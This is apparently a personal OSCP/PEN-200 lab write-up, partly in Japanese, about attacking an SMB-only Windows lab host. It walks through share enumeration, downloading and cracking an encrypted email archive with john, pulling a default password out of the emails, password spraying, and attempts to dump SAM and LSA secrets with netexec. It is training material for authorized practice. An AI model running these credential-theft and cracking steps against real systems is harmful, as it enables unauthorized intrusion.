# Nmap

```zsh
PORT   STATE SERVICE REASON  VERSION
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
```

---

# Enumeration

## enum4linux -> nothing

```zsh
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ enum4linux -aMld $TargetIP | tee enum4linux.log
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 10 18:36:05 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.115.111
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==========================( Enumerating Workgroup/Domain on 192.168.115.111 )==========================


[E] Can't find workgroup/domain



 ==============================( Nbtstat Information for 192.168.115.111 )==============================

Looking up status of 192.168.115.111
No reply from 192.168.115.111

 ==================================( Session Check on 192.168.115.111 )==================================


[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

```

## list share

```zsh
# null -> enum4linuxと同じく負荷
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ netexec smb $TargetIP --shares               
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [-] Error enumerating shares: [Errno 32] Broken pipe

# guest
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ netexec smb $TargetIP -u guest -p '' --shares
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [+] oscp\guest: 
SMB         192.168.115.111 445    OSCP             [*] Enumerated shares
SMB         192.168.115.111 445    OSCP             Share           Permissions     Remark
SMB         192.168.115.111 445    OSCP             -----           -----------     ------
SMB         192.168.115.111 445    OSCP             ADMIN$                          Remote Admin
SMB         192.168.115.111 445    OSCP             AnneAuto        READ            Anne's Automatic BackUps
SMB         192.168.115.111 445    OSCP             C$                              Default share
SMB         192.168.115.111 445    OSCP             IPC$            READ            Remote IPC
```

- AnneAutoに接続し、ファイルをダウンロード
```zsh
──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ smbclient -W oscp -U 'guest' \\\\$TargetIP\\AnneAuto
Password for [OSCP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug 25 00:12:37 2023
  ..                                  D        0  Fri Aug 25 00:12:37 2023
  emails.zip                          A    70052  Fri Aug 25 00:12:37 2023

                10328063 blocks of size 4096. 5848758 blocks available
                
smb: \> get emails.zip
getting file \emails.zip of size 70052 as emails.zip (34.4 KiloBytes/sec) (average 34.4 KiloBytes/sec)
smb: \> 
```

- ファイルアップロード権限はあるか確認 -> なし
```zsh
smb: \> put test.txt
NT_STATUS_ACCESS_DENIED opening remote file \test.txt

```

- email.zipは暗号化されていたので、zip2johnでパスワード解析試行
```zsh
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ zip2john -o emails/2023_Week38/20230920093456.msg emails_bkup.zip > hash2.txt
Using file emails/2023_Week38/20230920093456.msg as only file to check
```
![[Pasted image 20260110190259.png]]


```zsh
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt 
```
- *crack*!
![[Pasted image 20260110191049.png]]

## email.zip

- 中身を確認していくが、量が多いので、パスワードを抽出できないか試す
```zsh
┌──(koshi㉿kali)-[~/PEN-200/Beta/emails]
└─$ grep -EiR "pass(word)?|pwd|cred(ential)?" . 2>/dev/null  
./2023_Week38/20230922084703.msg:  The password will be our default one, used after a password reset: Voltaic1992
```

`2023_Week38/20230922084703.msg` の中身を読むと、`spayne@oscp.exam`の認証情報を確認
![[Pasted image 20260110191657.png]]

→[[OSCP/OSCP/Lab_Writeup/OSCP/Beta/Exploit|Exploit]]でパスワードスプレーアタック
- →成功しないので、あらかたメールを読んでみる
	- **2023_Week38以外は読めない**
- 上記のパスワードは、"our default one"ということなので、入手したユーザーに対し、上記のパスワードでスプレーする
- →sashaでguestログインが可能、ということくらいしかわからない(sashaでログインしても特に何もないし、putもできない)
	- ダメ元でRDP接続するも無理

 - 以下検証する
 ```zsh
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ netexec smb $TargetIP -u sasha -p 'Voltaic1992' -x whoami
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [+] oscp\sasha:Voltaic1992 
```

```zsh
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ netexec smb $TargetIP -u sasha -p 'Voltaic1992' --qwinsta 
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [+] oscp\sasha:Voltaic1992 
```
- qwinsta: https://www.netexec.wiki/smb-protocol/enumeration/enumerate-active-windows-sessions?q=

```zsh
# sam
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ netexec smb $TargetIP -u sasha -p 'Voltaic1992' --sam
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [+] oscp\sasha:Voltaic1992 

# lsa
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ netexec smb $TargetIP -u sasha -p 'Voltaic1992' --lsa
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [+] oscp\sasha:Voltaic1992


┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ netexec smb $TargetIP -u sasha -p 'Voltaic1992' --lsa secdump
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [+] oscp\sasha:Voltaic1992 

```

```zsh
# user
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ netexec smb $TargetIP -u sasha -p 'Voltaic1992' --users
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [+] oscp\sasha:Voltaic1992 


# group
netexec smb $TargetIP -u sasha -p 'Voltaic1992' --group
```

- backup?
```zsh
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ nxc smb $TargetIP -u sasha -p 'Voltaic1992' -M backup_operator
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [+] oscp\sasha:Voltaic1992 
BACKUP_O... 192.168.115.111 445    OSCP             [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 192.168.115.111 445    OSCP             [-] Couldn't save HKLM\SAM: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied  on path \\192.168.115.111\SYSVOL\SAM
```

- keepass? -> nothing
```zsh
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ nxc smb $TargetIP -u sasha -p 'Voltaic1992' -M keepass_discover
SMB         192.168.115.111 445    OSCP             [*] Windows 10 / Server 2019 Build 17763 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.115.111 445    OSCP             [+] oscp\sasha:Voltaic1992 

```

- logged on user?
```zsh
┌──(koshi㉿kali)-[~/PEN-200/Beta]
└─$ netexec smb $TargetIP -u sasha -p 'Voltaic1992' --loggedon-users

```



---

# Screenshot

![[Pasted image 20260110190036.png]]

```
